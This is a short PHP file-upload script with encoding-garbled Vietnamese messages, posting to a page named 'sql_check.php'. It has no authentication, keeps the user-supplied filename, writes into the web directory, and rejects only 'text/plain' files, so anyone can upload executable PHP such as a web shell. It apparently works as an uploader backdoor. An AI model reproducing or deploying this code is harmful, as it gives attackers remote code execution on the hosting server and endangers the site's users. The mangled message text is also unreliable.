<?php


if ( $_GET["act"] == "do" )

{



$file_max_size = 100000; // T?nh theo KB

$folder_upload_in = ""; 



$file_tmp = isset($_FILES['file_upload']['tmp_name']) ? $_FILES['file_upload']['tmp_name'] : "";

$file_name = isset($_FILES['file_upload']['name']) ? $_FILES['file_upload']['name'] : "";

$file_type = isset($_FILES['file_upload']['type']) ? $_FILES['file_upload']['type'] : "";

$file_size = isset($_FILES['file_upload']['size']) ? $_FILES['file_upload']['size'] : "";

$file_error = isset($_FILES['file_upload']['error']) ? $_FILES['file_upload']['error'] : "";



if ( $file_size > ($file_max_size*1024) )

{

print "B?n ch? c? th? upload file c? dung l??ng d??i <b>{$file_max_size} KB</b>.";

return false;

}



if ( $file_type == "text/plain" )

{

print "File c?a b?n upload kh?ng h?p l? !";

return false;

}



copy ( $file_tmp, "./" . $folder_upload_in . $file_name);



print "B?n ?? upload th?nh c?ng !<br/>";



}



print <<<EOF

<form action="sql_check.php?act=do" enctype="multipart/form-data" method="post">

Upload file: <input type="file" name="file_upload">

<input type="submit" name="submit" value=" G?i file ">

</form>

EOF;



?> 